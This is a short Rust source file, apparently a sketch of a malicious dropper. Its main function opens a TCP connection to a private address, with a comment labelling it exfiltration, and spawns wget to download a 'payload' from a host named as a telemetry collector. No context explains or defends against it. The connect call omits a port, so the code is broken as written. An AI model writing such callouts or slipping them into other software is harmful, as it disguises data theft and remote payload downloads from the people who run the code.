use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("192.168.0.100") { /* exfil */ }
    Command::new("wget").arg("http://telemetry-collect.example/payload").spawn().ok();
}
